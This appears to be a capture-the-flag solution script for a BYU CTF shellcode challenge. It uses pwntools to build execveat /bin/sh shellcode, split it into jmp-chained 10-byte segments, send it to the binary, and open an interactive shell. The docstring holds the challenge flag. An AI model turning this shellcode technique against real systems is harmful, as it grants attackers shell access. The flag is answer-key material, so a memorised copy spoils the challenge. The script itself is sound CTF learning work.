#!/usr/bin/env python3


"""
For this challenge, is taking our input and loading onto the stack and executing it.
The only issue is that it is also placing our code at 10 byte gaps which require
us to create a payload that can a. fit within 32 bytes but also b. not have a single instruction
larger than 8 bytes.

The real trick is loading /bin/sh onto the stack within this limitation.
This was achieved by splitting it into two 32 bit values and loading those
onto the stack directly.

Main bits of shellcode sourced from shellstorm:
https://shell-storm.org/shellcode/files/shellcode-905.html
byuctf{1m_als0_pretty_new_t0_pwn_s0_h0p3_it_was_g00d}
"""

from pwn import *


exe = ELF("./shellcode")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       b *main+336
                       c
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")
    context.update(arch = 'amd64', os = 'linux')
    log.progress("Generating shellcode")
    shellcode = [
        # Prep stuff for syscall
        asm("push   0x42"),
        asm("pop    rax"),
        asm("inc    ah"),
        asm("cqo"),
        asm("push   rdx"),
        # Place /bin//sh onto the stack
        asm("push 0x69622f2f"),
        asm("mov dword ptr [rsp+4], 0x68732f6e"),
        # Rest of syscall stuff
        asm("push   rsp"),
        asm("pop    rsi"),
        asm("mov    r10, rdx"),
        asm("mov    r8, rdx"),
        asm("syscall"),
            ]
    log.progress("Placing shellcode into four separate 10 byte payloads")
    payload = [b'',b'',b'',b'']
    curr = 0
    # This assembly instruction jumps forward 24 bytes in memory
    # if we place it at the last two bytes of our payload it will
    # jump to the next payload
    # The exception is the last payload
    spacer = asm("jmp $+24")
    # Go through every assembly instruction
    for instruction in shellcode:
        # Check if we can fit the instruction in this segment
        # The first check is generic, and the second only applies to the last segment
        # since we do not need to add the spacer
        if len(payload[curr])+len(instruction) <= 8 or (curr == 3 and len(payload[curr])+len(instruction) <= 10):
            # Add the instruction to the current segment
            payload[curr] += instruction
        # Otherwise check if we still have segments to create
        elif curr != 3:
            # Pad the payload to be 10 bytes exactly so our spacer will work
            while len(payload[curr]) != 8:
                payload[curr] += asm("nop")
            # Add our jmp instruction
            payload[curr] += spacer
            # Increment our counter and add this instruction to the next segment
            curr += 1
            payload[curr] += instruction

    log.progress("Sending payload")
    # Send the segments
    for segment in payload:
        r.send(segment)

    log.progress("Popping shell")
    # Pop shell
    r.interactive()


if __name__ == "__main__":
    main()

